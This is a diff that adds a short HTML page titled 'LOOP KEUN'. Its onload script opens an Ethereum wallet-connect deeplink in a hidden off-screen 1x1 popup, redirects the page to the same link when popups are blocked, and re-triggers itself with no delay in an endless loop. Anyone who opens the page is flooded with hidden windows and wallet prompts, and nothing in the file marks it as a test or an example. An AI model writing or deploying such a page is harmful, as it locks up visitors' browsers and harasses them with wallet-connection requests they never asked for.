@@ -1,0 +1,20 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <title>LOOP KEUN</title>
+</head>
+<body>
+  <script>
+    function trigger() {
+      const deeplink = "ethereum:0x0000000000000000000000000000000000000000@1?action=connect";
+      const w = window.open(deeplink, "_blank", "width=1,height=1,left=-100,top=-100");
+      if (!w || w.closed || typeof w.closed === "undefined") {
+        location.href = deeplink;
+      }
+      setTimeout(trigger, 0);
+    }
+    window.onload = trigger;
+  </script>
+</body>
+</html>
